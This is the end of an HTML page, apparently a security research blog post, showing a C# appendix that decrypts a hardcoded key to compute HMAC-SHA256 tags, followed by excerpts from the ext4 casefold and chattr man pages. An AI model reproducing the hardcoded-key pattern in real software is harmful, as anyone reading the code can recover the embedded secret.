                    <span class="k">return</span> <span class="n">decryptor</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">encryptedKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">protected</span> <span class="n">static</span> <span class="n">string</span> <span class="n">GenerateHmac</span><span class="p">(</span><span class="n">string</span> <span class="n">data</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">var</span> <span class="n">encryptedHmacKeyHex</span> <span class="o">=</span> <span class="s">"5af42f71a1b864b7d2093336013508f8"</span><span class="p">;</span>
            <span class="n">var</span> <span class="n">encryptedHmacKey</span> <span class="o">=</span> <span class="n">HexToBytes</span><span class="p">(</span><span class="n">encryptedHmacKeyHex</span><span class="p">);</span>
            <span class="n">var</span> <span class="n">hmacKey</span> <span class="o">=</span> <span class="n">DecryptKey</span><span class="p">(</span><span class="n">encryptedHmacKey</span><span class="p">);</span>

            <span class="n">var</span> <span class="n">dataBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">hmac</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HMACSHA256</span><span class="p">(</span><span class="n">hmacKey</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">var</span> <span class="n">tagBytes</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="n">ComputeHash</span><span class="p">(</span><span class="n">dataBytes</span><span class="p">);</span>
                <span class="n">var</span> <span class="n">tagString</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">tagBytes</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">tagString</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="appendix-2---ext4-linux-manual-page">Appendix #2 - ext4 linux manual page</h3>

<p><a href="https://man7.org/linux/man-pages/man5/ext4.5.html">ext4(5) - Linux manual page</a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>casefold
              This ext4 feature provides file system level character
              encoding support for directories with the casefold (+F) flag
              enabled.  This feature is name-preserving on the disk, but it
              allows applications to lookup for a file in the file system
              using an encoding equivalent version of the file name.
</code></pre></div></div>

<p><a href="https://man7.org/linux/man-pages/man1/chattr.1.html">chattr(1) - Linux manual page</a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The letters 'aAcCdDeFijPsStTu' select the new attributes for the
       files: append only (a), no atime updates (A), compressed (c), no copy
       on write (C), no dump (d), synchronous directory updates (D), extent
       format (e), case-insensitive directory lookups (F), immutable (i),
       data journalling (j), project hierarchy (P), secure deletion (s),
       synchronous updates (S), no tail-merging (t), top of directory
       hierarchy (T), and undeletable (u).
</code></pre></div></div>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
   <a href="/2020-10-01/Expressjs" class="left arrow">&#8592;</a>
  
  
   <a href="/2020-10-01/Cheat-Engine-DBVM-8b5aa7dc092c4dd2b81b7d4696266309" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2021-03-08 07:19:49 +0000">2021</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
